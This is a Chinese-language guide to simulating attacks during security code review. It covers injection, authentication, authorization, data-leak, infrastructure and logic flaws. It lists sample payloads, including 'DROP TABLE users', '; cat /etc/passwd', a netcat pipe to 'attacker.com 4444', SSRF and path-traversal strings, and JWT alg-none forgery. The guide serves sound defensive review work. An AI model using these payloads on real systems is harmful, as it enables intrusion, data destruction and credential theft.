# 攻击模拟指南

对于每种漏洞类型，请遵循以下特定的模拟方法。像攻击者一样遍历代码，追踪从入口点到影响的数据流。

## 通用方法

对于威胁模型中的每条攻击路径：

1. **识别入口点** —— 具体的函数、端点或输入字段
2. **构造恶意输入** —— 攻击者会发送的具体载荷
3. **追踪数据流** —— 跟踪输入经过的每个函数、转换和分支
4. **识别危险点（sink）** —— 输入到达危险操作的位置（查询、命令、渲染、文件写入）
5. **检查防护措施** —— 入口和危险点之间是否存在验证、编码或授权？
6. **判定** —— 如果防护措施阻止了攻击则为 BLOCKED，如果未缓解地到达危险点则为 VULNERABLE

将每次模拟记录为：

```
[PATH-N] <攻击名称>
入口: <函数/端点>
载荷: <具体示例>
流程: <入口> → <步骤> → <步骤> → <危险点>
防护: <阻止攻击的措施，或 "无">
判定: BLOCKED | VULNERABLE
```

## 注入攻击模拟

### SQL 注入

- 需追踪的载荷：`' OR 1=1 --`、`'; DROP TABLE users; --`、`' UNION SELECT password FROM users --`
- 验证：查询是否参数化？ORM 是否正确转义？是否存在原始 SQL 拼接？
- 检查存储过程中是否有动态 SQL

### 命令注入

- 需追踪的载荷：`; cat /etc/passwd`、`$(whoami)`、`` `id` ``、`| nc attacker.com 4444`
- 验证：子进程调用是否使用 `shell=False` 和数组参数？是否使用了 `os.system()` 或 `exec()`？
- 检查通过文件名、环境变量或配置值的间接注入

### XSS（跨站脚本）

- 需追踪的载荷：`<script>alert(1)</script>`、`" onmouseover="alert(1)`、`javascript:alert(1)`
- 验证：输出是否针对正确的上下文进行了编码（HTML 正文、属性、JS、CSS、URL）？
- 检查：是否存在 CSP 头并阻止内联脚本？

### 模板注入

- 需追踪的载荷：`{{7*7}}`（Jinja2）、`${7*7}`（Freemarker）、`<%= 7*7 %>`（ERB）
- 验证：用户输入是否传递给了模板渲染？是否启用了沙箱？

## 身份验证攻击模拟

### 暴力破解

- 攻击者能否进行无限次登录尝试？检查速率限制、锁定机制、CAPTCHA。
- 时间是否恒定？能否通过响应时间区分登录成功与失败？

### 会话攻击

- 会话令牌是否在 URL 中（Referer 泄露）？
- 登录后是否重新生成会话 ID？
- Cookie 是否设置了 Secure、HttpOnly、SameSite 标志？
- 攻击者能否通过预设置会话 ID 来固定会话？

### 令牌伪造

- 对于 JWT：将 `alg` 改为 `none`，将 `alg` 从 RS256 改为 HS256（密钥混淆），在不重新签名的情况下修改声明
- 对于 API 密钥：是否足够随机？能否被枚举？

## 授权攻击模拟

### IDOR（不安全的直接对象引用）

- 取一个用户 1 拥有的资源 A 的有效请求
- 将资源 ID 改为用户 2 拥有的资源 B
- 服务器是否检查了所有权？追踪授权逻辑。

### 权限提升

- 取一个普通用户的请求。添加管理员参数（`admin=true`、`role=admin`）
- 使用普通用户令牌访问仅管理员可用的端点
- 检查：角色检查是在中间件/装饰器中还是仅在路由级别？

### 水平越权

- 用户 A 尝试通过操纵 ID、路径或查询过滤器来访问用户 B 的数据
- 验证：每个数据访问查询是否包含用户/租户范围？

## 数据泄露攻击模拟

### 信息泄露

- 触发错误（无效输入、缺失资源、服务器错误）。响应是否包含堆栈跟踪、SQL 查询、内部路径？
- 检查 API 响应：是否返回了比客户端需要的更多字段？（过度获取）
- 审查日志：是否包含 PII、令牌、密码？

### 密钥泄露

- 在代码库中搜索：API 密钥、密码、令牌、连接字符串、私钥
- 检查：`.env` 文件、配置文件、CI/CD 配置、Docker 文件、Terraform 状态
- 密钥是在环境变量中还是在专用的密钥存储中？

## 基础设施攻击模拟

### SSRF（服务器端请求伪造）

- 需追踪的载荷：`http://169.254.169.254/latest/meta-data/`（AWS 元数据）、`http://localhost:6379`（Redis）、`file:///etc/passwd`
- 验证：应用程序是否根据用户输入发出 HTTP 请求？是否有 URL 验证？

### 路径遍历

- 需追踪的载荷：`../../etc/passwd`、`..%2f..%2fetc/passwd`、`....//....//etc/passwd`
- 验证：文件路径是否由用户输入构造？是否进行了规范化并与白名单比较？

### 反序列化

- 如果应用程序反序列化来自用户的数据（pickle、Java 序列化、YAML.load、PHP unserialize）：
- 攻击者能否构造在反序列化期间执行代码的载荷？
- 验证：是否使用了安全的加载器？类型是否受限？

## 逻辑攻击模拟

### 竞态条件

- 识别状态变更操作（余额扣减、库存递减、权限授予）
- 两个并发请求能否都在检查通过后、更新完成前通过？
- 验证：是否使用了原子操作、事务或锁？

### 业务逻辑绕过

- 能否跳过步骤？（例如，从购物车直接到确认而不付款）
- 能否提交负值？（例如，负数量以获得退款）
- 能否重放操作？（例如，多次使用优惠券）

### 拒绝服务

- 未认证用户能否触发昂贵操作？（复杂查询、大文件处理、正则表达式）
- 上传、请求体和查询参数是否有大小限制？
- 资源是否会被耗尽？（连接池、磁盘空间、通过解压炸弹耗尽内存）

## 判定标准

**BLOCKED**：在入口和危险点之间的代码路径中存在防护措施，可以阻止利用。该防护措施能处理特定的载荷类别（不仅是一个变体）。

**VULNERABLE**：不存在防护措施，或防护措施可被绕过（例如，仅客户端防护、错误的编码上下文、可被规避的正则表达式）。

当不确定时，倾向于判定为 VULNERABLE 并标记需要缓解措施。
